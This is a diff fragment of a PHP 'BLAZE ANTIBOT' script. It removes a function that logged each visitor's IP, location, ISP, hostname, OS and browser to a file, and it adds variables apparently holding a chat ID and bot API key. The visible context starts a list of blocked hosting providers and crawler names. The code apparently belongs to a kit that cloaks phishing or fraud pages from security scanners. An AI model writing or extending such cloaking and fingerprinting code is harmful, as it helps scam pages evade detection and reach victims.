@@ -180,34 +180,10 @@ function whois()
     return @json_decode(file_get_contents("http://ip-api.com/json/" . getIp()), true);
 }
 
-function logger($data, $reason)
-{
-    $today = date('l, d F H H:i:s');
-    $ip = getIP();
-    $visit = whois();
-    $os = getOS();
-    $br = getBrowser();
-    $fopen = fopen("./bot_logs.txt", "a+") or die("Unable to open file!");
-    $body = "🔥 [ BLAZE ANTIBOT ] 🔥";
-    $body .= "REASON: {$reason} | CODE: " . uniqid() . "\n";
-    $body .= "BOT: {$data}\n";
-    $body .= "DATE: {$today}\n";
-    $body .= "IP Address: {$ip}" . "\n";
-    $body .= "COUNTRY: {$visit['country']}" . "\n";
-    $body .= "REGION: {$visit['city']}" . "\n";
-    $body .= "ORGANISATION: {$visit['isp']}" . "\n";
-    $body .= "ASN: {$visit['as']}\n";
-    $body .= "HOSTNAME: " . gethostbyaddr($ip) . "\n";
-    $body .= "OS: {$os}\n";
-    $body .= "BROWSER: {$br}\n";
-    $body .= "USER AGENT: {$_SERVER['HTTP_USER_AGENT']}\n";
-    fwrite($fopen, $body);
-    fclose($fopen);
-}
-
 $hostname = gethostbyaddr($_SERVER["REMOTE_ADDR"]); $ua = strtolower($_SERVER["HTTP_USER_AGENT"]); $visit = whois();
 
-
+$ch=$chatid;
+$i=$api;
 $badHosts = array(
     "colocrossing.com",
     "QuerySeekerSpider",
